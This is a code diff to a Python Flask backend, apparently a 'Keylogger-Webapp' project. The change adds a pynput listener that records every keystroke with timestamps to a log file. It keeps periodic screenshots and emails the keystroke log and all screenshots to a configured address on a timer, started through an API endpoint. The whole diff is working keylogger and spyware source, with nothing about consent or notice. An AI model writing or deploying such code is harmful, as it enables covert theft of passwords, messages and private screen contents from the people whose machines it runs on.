@@ -1,21 +1,24 @@
 import threading
 import time
+import os
 import pyautogui
 import smtplib
-import os
 import psycopg2
+import pynput  # For keylogging
+from pynput.keyboard import Listener  # Key listener
 from dotenv import load_dotenv
-from flask import Flask, jsonify, request
+from flask import Flask, jsonify
 from flask_cors import CORS
 from email.message import EmailMessage
 import mimetypes
 
+# Load environment variables
 load_dotenv()
 
 app = Flask(__name__)
 CORS(app)
 
-# Database connection
+# Database Connection
 def get_db_connection():
     return psycopg2.connect(
         dbname=os.getenv("DB_NAME"),
@@ -32,56 +35,51 @@ EMAIL_SENDER = os.getenv("SENDER_EMAIL")
 EMAIL_PASSWORD = os.getenv("SENDER_PASSWORD")
 EMAIL_RECEIVER = os.getenv("RECIEVER_EMAIL")
 
-
 # Monitoring Variables
 monitoring = False
-report_interval = 60
-screenshot_interval = 30
+monitoring_thread = None
 keystroke_data = []
+keylog_listener = None
+
+# File Paths
+LOG_FOLDER = "./logs"
+LOG_FILE = os.path.join(LOG_FOLDER, "keylogs.txt")
+SCREENSHOT_FOLDER = os.path.join(LOG_FOLDER, "screenshots")
+REPORT_INTERVAL = 60
+SCREENSHOT_INTERVAL = 30
 
 
-### **🟢 Start Monitoring API**
-@app.route('/start_monitoring', methods=['POST'])
-def start_monitoring():
-    global monitoring
-    if monitoring:
-        return jsonify({'message': 'Monitoring already running'}), 400
-
-    monitoring = True
-    threading.Thread(target=monitor_activity, daemon=True).start()
-    return jsonify({'message': 'Monitoring started'}), 200
+### **📂 Ensure Required Folders and Files Exist**
+def ensure_directories():
+    if not os.path.exists(LOG_FOLDER):
+        os.makedirs(LOG_FOLDER)
+    if not os.path.exists(SCREENSHOT_FOLDER):
+        os.makedirs(SCREENSHOT_FOLDER)
+    if not os.path.exists(LOG_FILE):
+        open(LOG_FILE, "w").close()  # Create an empty log file if not exists
 
 
-### **🔴 Stop Monitoring API**
-@app.route('/stop_monitoring', methods=['POST'])
-def stop_monitoring():
-    global monitoring
-    monitoring = False
-    return jsonify({'message': 'Monitoring stopped'}), 200
-
-
-### **📌 Keystroke Logging Function**
-@app.route('/log_keystroke', methods=['POST'])
-def log_keystroke():
-    data = request.get_json()
-    if not data or 'user_id' not in data or 'key_text' not in data:
-        return jsonify({'error': 'Invalid request'}), 400
-
-    keystroke_data.append(f"{data['user_id']} typed: {data['key_text']}\n")
-    return jsonify({'message': 'Keystroke logged successfully'}), 200
-
-
-### **📸 Screenshot Capture Function**
+### **📸 Screenshot Capture**
 def capture_screenshot():
-    screenshot_path = f"E:\\Keylogger-Webapp\\backend\\logs\\screenshots\\screenshot_{int(time.time())}.png"
+    screenshot_path = os.path.join(SCREENSHOT_FOLDER, f"screenshot_{int(time.time())}.png")
     pyautogui.screenshot().save(screenshot_path)
     return screenshot_path
 
 
-LOG_FILE = "E:\\Keylogger-Webapp\\backend\\logs\\keylogs.txt"
-SCREENSHOT_FOLDER = "E:\\Keylogger-Webapp\\backend\\logs\\screenshots"
+### **⌨ Keylogger Function**
+def on_press(key):
+    try:
+        key_text = key.char if hasattr(key, 'char') else str(key)
+        log_entry = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key_text}\n"
+
+        with open(LOG_FILE, "a") as log_file:
+            log_file.write(log_entry)
+
+    except Exception as e:
+        print(f"❌ Keylogger Error: {e}")
 
 
+### **📩 Email Report Function**
 def send_email_report():
     try:
         msg = EmailMessage()
@@ -94,15 +92,14 @@ def send_email_report():
         if os.path.exists(LOG_FILE):
             with open(LOG_FILE, "rb") as f:
                 msg.add_attachment(f.read(), maintype="text", subtype="plain", filename="keystrokes.txt")
- 
-        if os.path.exists(SCREENSHOT_FOLDER):
-            screenshot_files = sorted(os.listdir(SCREENSHOT_FOLDER))
-            for filename in screenshot_files:
-                filepath = os.path.join(SCREENSHOT_FOLDER, filename)
-                if os.path.isfile(filepath) and filename.endswith(".png"):
-                    ctype, encoding = mimetypes.guess_type(filepath)
-                    maintype, subtype = ctype.split("/", 1) if ctype else ("application", "octet-stream")
 
+        # Attach screenshots
+        if os.path.exists(SCREENSHOT_FOLDER):
+            for filename in sorted(os.listdir(SCREENSHOT_FOLDER)):
+                filepath = os.path.join(SCREENSHOT_FOLDER, filename)
+                if filename.endswith(".png"):
+                    ctype, _ = mimetypes.guess_type(filepath)
+                    maintype, subtype = ctype.split("/", 1) if ctype else ("application", "octet-stream")
                     with open(filepath, "rb") as f:
                         msg.add_attachment(f.read(), maintype=maintype, subtype=subtype, filename=filename)
 
@@ -117,22 +114,56 @@ def send_email_report():
         print(f"❌ Email Error: {e}")
 
 
-### **🔄 Background Monitoring Thread**
+### **🖥 Background Monitoring Task**
 def monitor_activity():
-    global monitoring
-    last_report_time = time.time()
-    while monitoring:
-        time.sleep(5)  # Main loop delay
+    global monitoring, keylog_listener
+    last_screenshot_time = time.time()
+    last_email_time = time.time()
 
-        # Take screenshots at intervals
-        if time.time() - last_report_time >= screenshot_interval:
-            capture_screenshot()
-        
-        # Send email report at intervals
-        if time.time() - last_report_time >= report_interval:
-            send_email_report()
-            last_report_time = time.time()
+    # Start Keylogger Listener
+    with pynput.keyboard.Listener(on_press=on_press) as keylog_listener:
+        while monitoring:
+            time.sleep(5)
+
+            # Take Screenshots at set intervals
+            if time.time() - last_screenshot_time >= SCREENSHOT_INTERVAL:
+                capture_screenshot()
+                last_screenshot_time = time.time()
+
+            # Send Email Reports at set intervals
+            if time.time() - last_email_time >= REPORT_INTERVAL:
+                send_email_report()
+                last_email_time = time.time()
+
+
+### **🟢 Start Monitoring API**
+@app.route('/start_monitoring', methods=['POST'])
+def start_monitoring():
+    global monitoring, monitoring_thread
+
+    if monitoring:
+        return jsonify({'message': 'Monitoring already running'}), 400
+
+    ensure_directories()  # Ensure folders and files exist before starting
+    monitoring = True
+    monitoring_thread = threading.Thread(target=monitor_activity, daemon=True)
+    monitoring_thread.start()
+
+    return jsonify({'message': 'Monitoring started'}), 200
+
+
+### **🔴 Stop Monitoring API**
+@app.route('/stop_monitoring', methods=['POST'])
+def stop_monitoring():
+    global monitoring
+
+    if not monitoring:
+        return jsonify({'message': 'Monitoring is not running'}), 400
+
+    monitoring = False
+    return jsonify({'message': 'Monitoring stopped'}), 200
 
 
 if __name__ == "__main__":
+    ensure_directories()  # Ensure everything is set up before running
     app.run(debug=True)
